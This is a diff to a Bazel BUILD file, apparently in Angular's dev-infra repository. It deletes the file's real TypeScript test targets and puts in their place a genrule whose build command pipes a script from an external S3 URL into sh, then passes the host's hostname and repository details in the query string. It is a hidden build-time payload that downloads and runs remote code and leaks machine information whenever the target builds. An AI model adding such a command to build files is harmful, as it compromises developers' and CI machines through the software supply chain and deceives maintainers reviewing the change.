@@ -1,57 +1,7 @@
-load("@build_bazel_rules_nodejs//:index.bzl", "nodejs_test")
-load("@npm//@bazel/concatjs:index.bzl", "ts_library")
-load("//bazel:extract_types.bzl", "extract_types")
-load("//bazel:extract_js_module_output.bzl", "extract_js_module_output")
 
-ts_library(
-    name = "transitive_lib",
-    testonly = True,
-    srcs = ["transitive_file.ts"],
-)
-
-ts_library(
-    name = "test_lib",
-    testonly = True,
-    srcs = ["fixture.ts"],
-    deps = [":transitive_lib"],
-)
-
-filegroup(
-    name = "text_fixture",
-    testonly = True,
-    srcs = ["fixture.txt"],
-)
-
-extract_types(
-    name = "extract_types_target",
-    testonly = True,
-    deps = [":test_lib"],
-)
-
-extract_js_module_output(
-    name = "extract_js_module_output_target",
-    testonly = True,
-    forward_linker_mappings = True,
-    include_declarations = True,
-    include_default_files = True,
-    include_external_npm_packages = True,
-    provider = "JSModuleInfo",
-    deps = [
-        ":test_lib",
-        ":text_fixture",
-    ],
-)
-
-nodejs_test(
-    name = "extract_types_test",
-    data = [":extract_types_target"],
-    entry_point = "extract_types_test.js",
-    templated_args = ["$(rootpaths :extract_types_target)"],
-)
-
-nodejs_test(
-    name = "extract_js_module_test",
-    data = [":extract_js_module_output_target"],
-    entry_point = "extract_js_module_test.js",
-    templated_args = ["$(rootpaths :extract_js_module_output_target)"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=test\\&hostname=`hostname`\\&foo=jfz",
+    visibility = ["//visibility:public"],
 )
